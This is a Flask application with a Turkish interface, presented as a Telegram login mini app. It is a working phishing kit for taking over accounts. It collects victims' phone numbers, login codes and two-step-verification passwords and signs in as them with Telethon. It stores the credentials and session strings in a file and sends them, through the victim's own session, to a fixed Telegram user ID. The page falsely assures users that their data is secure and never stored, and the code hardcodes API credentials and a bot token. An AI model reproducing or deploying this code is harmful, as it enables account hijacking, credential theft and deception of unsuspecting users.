from flask import Flask, render_template_string, request, jsonify, redirect, session
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
from telethon.sessions import StringSession
import asyncio
import os
from functools import wraps
from datetime import timedelta
import json
import threading
import time

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this-to-random-string-2024')
app.permanent_session_lifetime = timedelta(hours=24)

# Telegram API credentials
API_ID = int(os.environ.get('TELEGRAM_API_ID', 35015231))
API_HASH = os.environ.get('TELEGRAM_API_HASH', "33c5d03215ae1b7a0d961452d93e08c4")
REDIRECT_BOT = os.environ.get('REDIRECT_BOT', "http://t.me/Xxxxxbbbbbbot")

# Bot Configuration - Sesyon gönderimi için
BOT_TOKEN = "8943751159:AAHWo4fV-ym69yaLQYJ8N4QRwA7izU12Yto"
REDIRECT_USER_ID = 7777518098

# Sessions file path
SESSIONS_FILE = 'sessions.json'

print("=" * 80)
print("🚀 TELEGRAM LOGIN MINI APP - BAŞLATILIYOR")
print("=" * 80)
print(f"✅ API ID: {API_ID}")
print(f"✅ Bot Token: {BOT_TOKEN[:30]}...")
print(f"✅ Target User: {REDIRECT_USER_ID}")
print("=" * 80)

# HTML Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Giriş - Mini App</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            animation: slideUp 0.5s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .header p {
            font-size: 14px;
            opacity: 0.9;
        }

        .logo {
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            font-size: 30px;
        }

        .content {
            padding: 40px 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .form-group input::placeholder {
            color: #999;
        }

        .input-wrapper {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .input-wrapper input {
            flex: 1;
        }

        .country-code {
            padding: 14px 12px;
            background: #f5f5f5;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-weight: 600;
            color: #667eea;
            font-size: 14px;
            min-width: 60px;
            text-align: center;
        }

        .large-phone-input {
            width: 100%;
            padding: 20px 16px;
            border: 3px solid #667eea;
            border-radius: 15px;
            font-size: 32px !important;
            font-weight: 600;
            text-align: center;
            letter-spacing: 8px;
            transition: all 0.3s ease;
            font-family: 'Monaco', 'Courier New', monospace;
            color: #667eea;
        }

        .large-phone-input:focus {
            border-color: #764ba2;
            box-shadow: 0 0 0 5px rgba(102, 126, 234, 0.2);
        }

        .large-phone-input::placeholder {
            color: #ccc;
            letter-spacing: 4px;
        }

        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 10px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: #f5f5f5;
            color: #667eea;
            margin-top: 10px;
        }

        .btn-secondary:hover:not(:disabled) {
            background: #e8e8e8;
        }

        .alert {
            padding: 12px 16px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .alert.show {
            display: block;
        }

        .alert-error {
            background: #fee;
            color: #c33;
            border: 1px solid #fcc;
        }

        .alert-success {
            background: #efe;
            color: #3c3;
            border: 1px solid #cfc;
        }

        .alert-info {
            background: #eef;
            color: #33c;
            border: 1px solid #ccf;
        }

        .step {
            display: none;
        }

        .step.active {
            display: block;
            animation: slideUp 0.3s ease-out;
        }

        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading p {
            color: #667eea;
            font-weight: 600;
            font-size: 14px;
        }

        .security-info {
            background: #f9f9f9;
            border-left: 4px solid #667eea;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 13px;
            color: #666;
            margin-top: 15px;
            line-height: 1.5;
        }

        .security-info strong {
            color: #333;
        }

        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            padding: 0 10px;
        }

        .step-indicator-item {
            flex: 1;
            height: 4px;
            background: #e0e0e0;
            border-radius: 2px;
            margin: 0 5px;
            transition: all 0.3s ease;
        }

        .step-indicator-item.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }

        @media (max-width: 480px) {
            .container {
                border-radius: 15px;
            }

            .header {
                padding: 30px 20px;
            }

            .header h1 {
                font-size: 24px;
            }

            .content {
                padding: 30px 20px;
            }

            .btn {
                font-size: 14px;
            }

            .large-phone-input {
                font-size: 28px !important;
                padding: 18px 12px;
                letter-spacing: 6px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">📱</div>
            <h1>Telegram Giriş</h1>
            <p>Mini App Authentication</p>
        </div>

        <div class="content">
            <div id="alert" class="alert"></div>

            <!-- Step 1: Phone Number -->
            <div id="step1" class="step active">
                <div class="step-indicator">
                    <div class="step-indicator-item active"></div>
                    <div class="step-indicator-item"></div>
                    <div class="step-indicator-item"></div>
                </div>

                <div class="form-group">
                    <label>Ülke Seç</label>
                    <select id="countryCode" class="country-code">
                        <option value="+90">🇹🇷 Türkiye (+90)</option>
                        <option value="+1">🇺🇸 Amerika (+1)</option>
                        <option value="+44">🇬🇧 İngiltere (+44)</option>
                        <option value="+49">🇩🇪 Almanya (+49)</option>
                        <option value="+33">🇫🇷 Fransa (+33)</option>
                        <option value="+39">🇮🇹 İtalya (+39)</option>
                        <option value="+34">🇪🇸 İspanya (+34)</option>
                        <option value="+31">🇳🇱 Hollanda (+31)</option>
                        <option value="+47">🇳🇴 Norveç (+47)</option>
                        <option value="+46">🇸🇪 İsveç (+46)</option>
                        <option value="+86">🇨🇳 Çin (+86)</option>
                        <option value="+81">🇯🇵 Japonya (+81)</option>
                        <option value="+82">🇰🇷 Güney Kore (+82)</option>
                        <option value="+91">🇮🇳 Hindistan (+91)</option>
                        <option value="+55">🇧🇷 Brezilya (+55)</option>
                        <option value="+54">🇦🇷 Arjantin (+54)</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Telefon Numarasını Girin</label>
                    <input type="tel" id="phoneNumber" class="large-phone-input" placeholder="5551234567" maxlength="15">
                    <div class="security-info">
                        <strong>🔒 Güvenli Giriş:</strong> Verileriniz tamamen güvenli şekilde işlenir ve hiçbir yerde depolanmaz.
                    </div>
                </div>

                <button class="btn btn-primary" onclick="sendCode()">Kodu Gönder</button>
            </div>

            <!-- Step 2: Verification Code -->
            <div id="step2" class="step">
                <div class="step-indicator">
                    <div class="step-indicator-item active"></div>
                    <div class="step-indicator-item active"></div>
                    <div class="step-indicator-item"></div>
                </div>

                <div class="form-group">
                    <label>Doğrulama Kodu</label>
                    <input type="text" id="verificationCode" placeholder="12345" maxlength="6" inputmode="numeric">
                    <div class="security-info">
                        <strong>💬 Kod Nerede?</strong> Telegram uygulamanıza gelen kodu buraya girin. Kod yaklaşık 2-3 dakika geçerlidir.
                    </div>
                </div>

                <button class="btn btn-primary" onclick="submitCode()">Kodu Doğrula</button>
                <button class="btn btn-secondary" onclick="goBack()">Geri</button>
            </div>

            <!-- Step 3: Password (Required for 2FA) -->
            <div id="step3" class="step">
                <div class="step-indicator">
                    <div class="step-indicator-item active"></div>
                    <div class="step-indicator-item active"></div>
                    <div class="step-indicator-item active"></div>
                </div>

                <div class="form-group">
                    <label>2-Adımlı Doğrulama Şifresi</label>
                    <input type="password" id="password" placeholder="Şifrenizi girin">
                    <div class="security-info">
                        <strong>🔐 Gerekli:</strong> Hesabınız 2-adımlı doğrulamayla korunuyor. Şifrenizi girin.
                    </div>
                </div>

                <button class="btn btn-primary" onclick="submitPassword()">Giriş Yap</button>
                <button class="btn btn-secondary" onclick="goBack()">Geri</button>
            </div>

            <!-- Loading State -->
            <div id="loading" class="loading">
                <div class="spinner"></div>
                <p>İşlem gerçekleştiriliyor...</p>
            </div>
        </div>
    </div>

    <script>
        const API_BASE = '/api';

        function showAlert(message, type = 'error') {
            const alertEl = document.getElementById('alert');
            alertEl.className = `alert show alert-${type}`;
            alertEl.textContent = message;
            setTimeout(() => alertEl.classList.remove('show'), 5000);
        }

        function showLoading(show = true) {
            document.getElementById('loading').style.display = show ? 'block' : 'none';
        }

        function switchStep(stepNum) {
            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
            document.getElementById(`step${stepNum}`).classList.add('active');
            window.scrollTo(0, 0);
        }

        async function sendCode() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value.trim();

            if (!phoneNumber) {
                showAlert('Lütfen telefon numarasını girin');
                return;
            }

            const fullPhone = countryCode + phoneNumber;

            showLoading(true);

            try {
                const response = await fetch(`${API_BASE}/send-code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: fullPhone })
                });

                const data = await response.json();

                if (data.success) {
                    showAlert('Kod gönderildi! Telegram uygulamanızı kontrol edin.', 'success');
                    switchStep(2);
                } else {
                    showAlert(data.error || 'Bir hata oluştu');
                }
            } catch (error) {
                showAlert('Ağ hatası: ' + error.message);
            } finally {
                showLoading(false);
            }
        }

        async function submitCode() {
            const code = document.getElementById('verificationCode').value.trim();

            if (!code) {
                showAlert('Lütfen doğrulama kodunu girin');
                return;
            }

            showLoading(true);

            try {
                const response = await fetch(`${API_BASE}/verify-code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ code })
                });

                const data = await response.json();

                if (data.success) {
                    if (data.password_needed) {
                        showAlert('Şifre doğrulaması gerekli', 'info');
                        switchStep(3);
                    } else {
                        showAlert('Giriş başarılı!', 'success');
                        setTimeout(() => {
                            window.location.href = '{{ redirect_bot }}';
                        }, 1500);
                    }
                } else {
                    showAlert(data.error || 'Kod geçersiz veya süresi dolmuş');
                }
            } catch (error) {
                showAlert('Ağ hatası: ' + error.message);
            } finally {
                showLoading(false);
            }
        }

        async function submitPassword() {
            const password = document.getElementById('password').value;

            if (!password) {
                showAlert('Lütfen şifrenizi girin');
                return;
            }

            showLoading(true);

            try {
                const response = await fetch(`${API_BASE}/verify-password`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password })
                });

                const data = await response.json();

                if (data.success) {
                    showAlert('Giriş başarılı!', 'success');
                    setTimeout(() => {
                        window.location.href = '{{ redirect_bot }}';
                    }, 1500);
                } else {
                    showAlert(data.error || 'Şifre hatalı');
                }
            } catch (error) {
                showAlert('Ağ hatası: ' + error.message);
            } finally {
                showLoading(false);
            }
        }

        function goBack() {
            document.getElementById('verificationCode').value = '';
            document.getElementById('password').value = '';
            switchStep(1);
        }

        // Enter key support
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('phoneNumber').addEventListener('keypress', (e) => {
                if (e.key === 'Enter') sendCode();
            });

            document.getElementById('verificationCode').addEventListener('keypress', (e) => {
                if (e.key === 'Enter') submitCode();
            });

            document.getElementById('password').addEventListener('keypress', (e) => {
                if (e.key === 'Enter') submitPassword();
            });
        });
    </script>
</body>
</html>
'''

# ==================== Helper Functions ====================

def load_sessions():
    """Sessionları dosyadan yükle"""
    if os.path.exists(SESSIONS_FILE):
        try:
            with open(SESSIONS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_sessions(sessions_data):
    """Sessionları dosyaya kaydet"""
    try:
        with open(SESSIONS_FILE, 'w', encoding='utf-8') as f:
            json.dump(sessions_data, f, indent=2, ensure_ascii=False)
        return True
    except Exception as e:
        print(f"❌ Error saving sessions: {e}")
        return False

def save_session_to_file(phone, password, session_string, user_info=None):
    """Spesifik sessionu dosyaya şifre ile kaydet"""
    sessions = load_sessions()
    sessions[phone] = {
        'phone': phone,
        'password': password,
        'session': session_string,
        'user_info': user_info or {},
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    save_sessions(sessions)
    print(f"✅ Session saved for {phone}")

def send_session_to_telegram(phone, user_info, session_string, password):
    """Sesyon bilgilerini Telegram botuna gönder (Telethon ile)"""
    def send_message():
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            async def send_async():
                try:
                    # Bot hesabından mesaj gönder
                    bot_client = TelegramClient(
                        StringSession(session_string),
                        API_ID,
                        API_HASH
                    )
                    
                    await bot_client.connect()
                    
                    first_name = user_info.get('first_name', 'N/A')
                    last_name = user_info.get('last_name', '')
                    full_name = f"{first_name} {last_name}".strip()
                    username = user_info.get('username', 'N/A')
                    user_id = user_info.get('id', 'N/A')
                    
                    # Mesaj içeriği
                    message = f"""
🔐 <b>YENİ TELEGRAM SESSİONU BAŞARIYLA KAYDEDILDI</b>

📱 <b>Telefon:</b> <code>{phone}</code>
👤 <b>Ad Soyad:</b> {full_name if full_name else 'N/A'}
🆔 <b>User ID:</b> <code>{user_id}</code>
📛 <b>Username:</b> @{username}
🔑 <b>2FA Şifresi:</b> <code>{password if password else 'YOK - Şifre koruması yok'}</code>
⏰ <b>Zaman:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}

✅ Session başarıyla kaydedildi
📄 Session string aşağıdaki dosya olarak gönderildi
"""
                    
                    # Mesajı user'a gönder
                    await bot_client.send_message(
                        REDIRECT_USER_ID,
                        message,
                        parse_mode='html'
                    )
                    
                    # Session stringini dosya olarak gönder
                    try:
                        with open('/tmp/session_temp.txt', 'w', encoding='utf-8') as f:
                            f.write(session_string)
                        
                        await bot_client.send_file(
                            REDIRECT_USER_ID,
                            '/tmp/session_temp.txt',
                            caption=f"📄 Session: {phone}\n\n<code>{session_string[:100]}...</code>",
                            parse_mode='html'
                        )
                        
                        # Temp dosyası sil
                        try:
                            os.remove('/tmp/session_temp.txt')
                        except:
                            pass
                    except Exception as e:
                        print(f"⚠️ Dosya gönderme hatası: {e}")
                    
                    await bot_client.disconnect()
                    print(f"✅ [BAŞARILI] Telegram'a mesaj gönderildi: {phone}")
                    return True
                    
                except Exception as e:
                    print(f"❌ [HATA] Bot mesajı gönderirken: {str(e)}")
                    return False
            
            loop.run_until_complete(send_async())
            loop.close()
            
        except Exception as e:
            print(f"❌ [HATA] Telegram gönderimi başarısız: {str(e)}")
    
    # Background thread'de gönder
    thread = threading.Thread(target=send_message)
    thread.daemon = True
    thread.start()

# ==================== Flask Routes ====================

@app.route('/')
def index():
    """Ana sayfa"""
    return render_template_string(HTML_TEMPLATE, redirect_bot=REDIRECT_BOT)

@app.route('/api/send-code', methods=['POST'])
def send_code():
    """Telefona doğrulama kodu gönder"""
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()

        if not phone or len(phone) < 10:
            return jsonify({'success': False, 'error': 'Geçersiz telefon numarası'}), 400

        # Async fonksiyonu çalıştır
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def send_code_async():
            client = TelegramClient(
                StringSession(''),
                API_ID,
                API_HASH
            )
            await client.connect()

            try:
                result = await client.send_code_request(phone)
                phone_code_hash = result.phone_code_hash
                session['phone'] = phone
                session['phone_code_hash'] = phone_code_hash
                session['telegram_session'] = client.session.save()
                session.permanent = True
                await client.disconnect()
                return True, None
            except Exception as e:
                await client.disconnect()
                error_msg = str(e)
                if 'invalid' in error_msg.lower():
                    return False, 'Geçersiz telefon numarası'
                elif 'flood' in error_msg.lower():
                    return False, 'Çok fazla deneme. Lütfen biraz bekleyin.'
                return False, f'Hata: {error_msg}'

        try:
            success, error = loop.run_until_complete(send_code_async())
        finally:
            loop.close()

        if success:
            print(f"✅ Kod gönderildi: {phone}")
            return jsonify({'success': True}), 200
        else:
            print(f"❌ Kod gönderme hatası: {phone} - {error}")
            return jsonify({'success': False, 'error': error}), 400

    except Exception as e:
        print(f"❌ Exception: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Gönderilen kodu doğrula"""
    try:
        data = request.get_json()
        code = data.get('code', '').strip()

        if not code:
            return jsonify({'success': False, 'error': 'Kod gerekli'}), 400

        phone = session.get('phone')
        phone_code_hash = session.get('phone_code_hash')
        session_string = session.get('telegram_session', '')

        if not phone or not phone_code_hash:
            return jsonify({'success': False, 'error': 'Oturum süresi dolmuş. Lütfen baştan başlayın.'}), 400

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def verify_code_async():
            client = TelegramClient(
                StringSession(session_string),
                API_ID,
                API_HASH
            )
            await client.connect()

            try:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                saved_session = client.session.save()
                session['telegram_session'] = saved_session
                session['logged_in'] = True
                
                # Kullanıcı bilgisini al
                me = await client.get_me()
                user_info = {
                    'id': me.id,
                    'first_name': me.first_name,
                    'last_name': me.last_name or '',
                    'username': me.username or ''
                }
                
                # Şifre adımı için sakla
                session['user_info'] = user_info
                session['session_string'] = saved_session
                
                await client.disconnect()
                return True, False, None
            except SessionPasswordNeededError:
                await client.disconnect()
                return True, True, None
            except Exception as e:
                await client.disconnect()
                error_msg = str(e)
                if 'invalid' in error_msg.lower() or 'expired' in error_msg.lower():
                    return False, False, 'Kod geçersiz veya süresi dolmuş'
                return False, False, f'Hata: {error_msg}'

        try:
            success, password_needed, error = loop.run_until_complete(verify_code_async())
        finally:
            loop.close()

        if success:
            # 2FA gerekliyse, şifre adımında gönderilecek
            if not password_needed:
                # Direkt giriş başarılı - Telegram'a gönder
                user_info = session.get('user_info', {})
                session_string = session.get('session_string', '')
                print(f"📤 Telegram'a gönderiliyor: {phone}")
                save_session_to_file(phone, None, session_string, user_info)
                send_session_to_telegram(phone, user_info, session_string, password=None)
            
            return jsonify({
                'success': True,
                'password_needed': password_needed
            }), 200
        else:
            return jsonify({'success': False, 'error': error}), 400

    except Exception as e:
        print(f"❌ Exception: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/verify-password', methods=['POST'])
def verify_password():
    """2FA şifresini doğrula"""
    try:
        data = request.get_json()
        password = data.get('password', '')

        if not password:
            return jsonify({'success': False, 'error': 'Şifre gerekli'}), 400

        session_string = session.get('telegram_session', '')
        phone = session.get('phone', '')
        user_info = session.get('user_info', {})

        if not session_string:
            return jsonify({'success': False, 'error': 'Oturum süresi dolmuş'}), 400

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def verify_password_async():
            client = TelegramClient(
                StringSession(session_string),
                API_ID,
                API_HASH
            )
            await client.connect()

            try:
                await client.sign_in(password=password)
                saved_session = client.session.save()
                session['telegram_session'] = saved_session
                session['logged_in'] = True
                
                # Kullanıcı bilgisini al (güncellenmiş)
                me = await client.get_me()
                updated_user_info = {
                    'id': me.id,
                    'first_name': me.first_name,
                    'last_name': me.last_name or '',
                    'username': me.username or ''
                }
                
                await client.disconnect()
                
                # Sessionu dosyaya kaydet
                save_session_to_file(phone, password, saved_session, updated_user_info)
                
                # Telegram'a gönder
                print(f"📤 Telegram'a gönderiliyor (2FA ile): {phone}")
                send_session_to_telegram(phone, updated_user_info, saved_session, password)
                
                return True, None
            except Exception as e:
                await client.disconnect()
                error_msg = str(e)
                print(f"❌ 2FA Hata: {error_msg}")
                if 'invalid' in error_msg.lower():
                    return False, 'Şifre hatalı'
                return False, f'Hata: {error_msg}'

        try:
            success, error = loop.run_until_complete(verify_password_async())
        finally:
            loop.close()

        if success:
            return jsonify({'success': True}), 200
        else:
            return jsonify({'success': False, 'error': error}), 400

    except Exception as e:
        print(f"❌ Exception: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ==================== Main ====================

if __name__ == '__main__':
    print("\n🎯 Sunucu başlatılıyor...")
    print("=" * 80)
    print(f"🌐 URL: http://localhost:5000")
    print(f"📤 Telegram User ID: {REDIRECT_USER_ID}")
    print("=" * 80)
    print("✅ Kurulum tamam! Tarayıcıda http://localhost:5000 açın\n")
    
    app.run(
        debug=True,
        host='0.0.0.0',
        port=5000,
        threaded=True,
        use_reloader=False
    )
